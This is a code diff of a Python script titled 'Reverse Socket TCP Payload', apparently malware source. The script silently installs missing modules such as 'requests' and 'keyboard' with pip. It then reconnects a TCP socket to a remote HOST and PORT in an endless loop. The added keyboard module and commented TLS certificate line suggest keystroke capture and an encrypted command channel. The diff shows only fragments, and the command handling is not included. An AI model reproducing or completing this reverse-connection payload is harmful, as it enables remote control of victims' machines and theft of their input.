@@ -1,12 +1,14 @@
+# Reverse Socket TCP Payload
 import os
 import platform
 import time
 import json
+import ssl
 import importlib
 import subprocess as sp
 import socket
 # list of the modules you have to install manually
-imports = ["requests"]
+imports = ["requests", "keyboard"]
 try:
     for i in imports:
         globals()[i] = importlib.import_module(i)
@@ -15,10 +17,6 @@ except:
         sp.call(["pip3", "install", i])
     for i in imports:
         globals()[i] = importlib.import_module(i)
-try:
-    from cryptography.fernet import Fernet
-except:
-    os.system("pip install cryptography -q -U")
 fernet = ""
 s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 
@@ -33,6 +31,7 @@ def encrypt(data):
 
 while True:
     try:
+        #cert = ssl.get_server_certificate((HOST, PORT), ssl_version=ssl.PROTOCOL_TLS_CLIENT)
         s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         s.connect((HOST, PORT))
     except socket.error as e:
